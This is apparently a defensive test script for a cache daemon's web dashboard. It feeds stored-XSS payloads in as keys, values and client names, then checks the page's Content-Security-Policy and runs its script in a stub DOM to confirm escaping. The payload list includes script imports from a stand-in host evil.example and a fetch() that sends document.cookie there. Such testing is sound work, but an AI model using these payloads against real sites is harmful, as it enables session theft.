#!/bin/sh
# xsstest.sh - S205: what goes into the cache cannot run in the dashboard.
#
# The operator was hacked through exactly this once: a key carrying a
# script import, a dashboard that rendered it, a browser that fetched
# the rest from a remote site.  Two layers, both asserted here:
#   1. every cache-fed string the page renders is escaped - keys, values,
#      client names, command names, slow-log arguments;
#   2. the page carries a Content-Security-Policy whose script-src is the
#      SHA-256 of its one inline script, so an injected script - inline
#      or remote - does not run even if a sink is missed, and the page
#      can talk to nothing but this node.
# Layer 1 is proved by RUNNING the page (js2py, stub DOM) after hostile
# strings went in through the doors, and scanning everything it wrote
# into the DOM.  Layer 2 by reading the headers and hashing the script.
# The detector is checked against a known-bad string first, so a green
# run means it looked.  js2py is not on the runner: layer 1 SKIPS
# loudly there, layer 2 still runs.
# Usage: test/xsstest.sh [./perfcached]
set -u
BIN=${1:-./perfcached}
D=$(mktemp -d /var/tmp/pcxss.XXXXXX)
P=
trap '[ -n "$P" ] && kill -9 $P 2>/dev/null; rm -rf "$D"' EXIT TERM INT

cat > "$D/a.conf" <<CONF
[daemon]
workers = 2
log_level = notice
slowlog_usec = 0
[memory]
arena_mb = 64
[secrets]
client = xss-client-secret
[listen]
tcp = 127.0.0.1:17936
resp = 127.0.0.1:17934
http = 127.0.0.1:17935
plaintext = loopback
[collection 0]
buckets_log2 = 12
CONF
chmod 600 "$D/a.conf"
"$BIN" -f "$D/a.conf" > "$D/a.log" 2>&1 &
P=$!
i=0; while [ $i -lt 100 ]; do grep -q "perfcached ready" "$D/a.log" && break; sleep 0.1; i=$((i+1)); done
grep -q "perfcached ready" "$D/a.log" || { echo "daemon did not start"; cat "$D/a.log"; exit 1; }

python3 - <<'PY_EOF'
import base64, hashlib, json, re, socket, sys, urllib.request, warnings
warnings.filterwarnings("ignore")

npass = nfail = 0
def ok(m):
    global npass; npass += 1; print("  ok   " + m)
def bad(m):
    global nfail; nfail += 1; print("  FAIL " + m)

# ---- hostile strings, in through the doors ------------------------------
PAY = [
    '<script>import("https://evil.example/x.js")</script>',
    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">',
    '"><svg/onload=alert(1)>',
    "' onmouseover='alert(1)",
    '</script><script src="https://evil.example/y.js"></script>',
]
s = socket.create_connection(("127.0.0.1", 17934), 8); s.settimeout(20)
f = s.makefile("rwb")
def resp(*a):
    f.write(("*%d\r\n" % len(a) + "".join("$%d\r\n%s\r\n" % (len(x.encode()), x) for x in a)).encode()); f.flush()
    line = f.readline()
    if line[:1] == b"$":
        n = int(line[1:]); f.read(n + 2) if n >= 0 else None
    elif line[:1] == b"*":
        n = int(line[1:])
        for _ in range(n):
            h = f.readline(); m = int(h[1:]); f.read(m + 2) if m >= 0 else None
    return line
resp("CLIENT", "SETNAME", "evil<script>1</script>")     # the client's own name
for i, p in enumerate(PAY):
    resp("SET", "k%d%s" % (i, p), "v%d%s" % (i, p))       # key AND value
    resp("GET", "k%d%s" % (i, p))
resp("NOSUCHVERB<script>2</script>", "x")                # an unknown command
resp("SET", "plain", "x")

page = urllib.request.urlopen("http://127.0.0.1:17935/", timeout=10)
hdrs = {k.lower(): v for k, v in page.getheaders()}
html = page.read().decode("utf-8", "replace")
stats = urllib.request.urlopen("http://127.0.0.1:17935/stats", timeout=10).read().decode()
members = urllib.request.urlopen("http://127.0.0.1:17935/members", timeout=10).read().decode()
clients = urllib.request.urlopen("http://127.0.0.1:17935/clients", timeout=10).read().decode() if True else "{}"

# the hostile strings did reach the daemon's own JSON (they are DATA there)
seen_in_json = sum(1 for p in PAY if p in stats or p in clients)
(ok if seen_in_json >= 1 else bad)("the hostile strings reached the daemon's JSON as data (%d of %d visible)" % (seen_in_json, len(PAY)))

# ---- layer 2: the policy --------------------------------------------------
csp = hdrs.get("content-security-policy", "")
script = re.search(r"<script>(.*)</script>", html, re.S).group(1)
want = base64.b64encode(hashlib.sha256(script.encode("utf-8")).digest()).decode()
(ok if csp else bad)("the page carries a Content-Security-Policy")
(ok if ("'sha256-%s'" % want) in csp else bad)(
    "its script-src is the SHA-256 of the page's own inline script (%s)" % (csp[:70] + "..." if csp else "none"))
(ok if "default-src 'none'" in csp and "connect-src 'self'" in csp and "'unsafe-inline'" not in csp.split("style-src")[0] else bad)(
    "default-src is none, connect-src is self, and scripts have no unsafe-inline")
(ok if hdrs.get("x-content-type-options") == "nosniff" and hdrs.get("x-frame-options") == "DENY"
      and hdrs.get("referrer-policy") == "no-referrer" else bad)(
    "nosniff, no framing, no referrer on the page")
j = urllib.request.urlopen("http://127.0.0.1:17935/stats", timeout=10)
jh = {k.lower(): v for k, v in j.getheaders()}
(ok if jh.get("x-content-type-options") == "nosniff" else bad)("the JSON answers carry nosniff too")

# ---- layer 1: the page, run -----------------------------------------------
# What would be LIVE if a sink were unescaped: a script tag anywhere (the
# page never writes one), an image or svg tag carrying an event handler,
# and the two attribute-breaking payloads with their quote intact.  The
# page writes its own <svg viewBox=...> sparklines, and an escaped payload
# keeps words like onmouseover= as plain text - neither is a hit.
def detector(s):
    return re.findall(r"<script|<img\b[^>]*onerror=|<svg/onload=|\"><svg/|\x27 onmouseover=\x27|<script src=", s, re.I)
(ok if detector('x<img src=y onerror=1>') else bad)("positive control: the detector flags a raw tag")
(ok if not detector('x&lt;img src=y onerror=1&gt; &#39; onmouseover=&#39;alert(1) <svg viewBox="0 0 1 1">') else bad)(
    "positive control: the detector accepts the escaped forms and the page\'s own svg")
try:
    import js2py
except Exception:
    print("  ..   SKIPPED layer 1: no js2py on this host - the page was NOT executed here")
    print("xsstest: %d passed, %d failed" % (npass, nfail)); sys.exit(1 if nfail else 0)

STUB = """
var __writes=[];
function El(id){ this.id=id; this._h=''; this._t=''; this.hidden=false; this.children=[]; this.style={};
  this.offsetHeight=100; this.__h=0; this.__i=0;
  this.classList={contains:function(c){return false;},toggle:function(c){return false;},add:function(){},remove:function(){}};
  this.addEventListener=function(){}; this.appendChild=function(){}; this.getAttribute=function(){return null;};
  this.getBoundingClientRect=function(){return {left:0,width:100,top:0,height:10};}; this.closest=function(){return null;};
  Object.defineProperty(this,'innerHTML',{get:function(){return this._h;},set:function(v){this._h=String(v);__writes.push(String(v));}});
  Object.defineProperty(this,'textContent',{get:function(){return this._t;},set:function(v){this._t=String(v);}}); }
var __els={};
var document={ getElementById:function(id){ if(!__els[id]) __els[id]=new El(id); return __els[id]; },
  querySelectorAll:function(q){ return []; }, addEventListener:function(){} };
var location={port:"17935"};
function setInterval(f,ms){return 0;} function setTimeout(f,ms){return 0;} function confirm(m){return false;} function alert(m){}
Math.min=function(){var i,m=Infinity;for(i=0;i<arguments.length;i++)if(arguments[i]<m)m=+arguments[i];return m;};
Math.max=function(){var i,m=-Infinity;for(i=0;i<arguments.length;i++)if(arguments[i]>m)m=+arguments[i];return m;};
var __DATA={};
function XMLHttpRequest(){ var self=this; this.readyState=0; this.status=0; this.responseText='';
  this.open=function(m,u,a){ self.__u=u; };
  this.send=function(){ self.readyState=4;
    if(__DATA[self.__u]!==undefined){ self.status=200; self.responseText=__DATA[self.__u]; } else { self.status=404; self.responseText=''; }
    if(self.onreadystatechange) self.onreadystatechange(); }; }
"""
ctx = js2py.EvalJs(); ctx.execute(STUB)
ctx.execute("__DATA['stats']=%s; __DATA['members']=%s; __DATA['clients']=%s;" % (json.dumps(stats), json.dumps(members), json.dumps(clients)))
err = None
try:
    ctx.execute(script)
    ctx.execute("CLOPEN=true; loadClients(); drawStats(JSON.parse(__DATA['stats']));")
except Exception as e:
    err = str(e)[:160]
(ok if err is None else bad)("the page renders the hostile data without throwing (%s)" % (err or "clean"))
writes = ctx.eval("__writes.join('\\n')") or ""
hits = detector(writes)
(ok if len(writes) > 1000 else bad)("the page wrote %d bytes of HTML to look at" % len(writes))
(ok if not hits else bad)("no hostile string reached the DOM unescaped (%d raw hits%s)" % (len(hits), ": " + ", ".join(sorted(set(hits))[:4]) if hits else ""))
esc_seen = writes.count("&lt;script")
(ok if esc_seen >= 1 else bad)("and the payloads are there, escaped (&lt;script x%d)" % esc_seen)

print("xsstest: %d passed, %d failed" % (npass, nfail))
sys.exit(1 if nfail else 0)
PY_EOF
rc=$?
echo "xsstest: done (rc=$rc)"
exit $rc
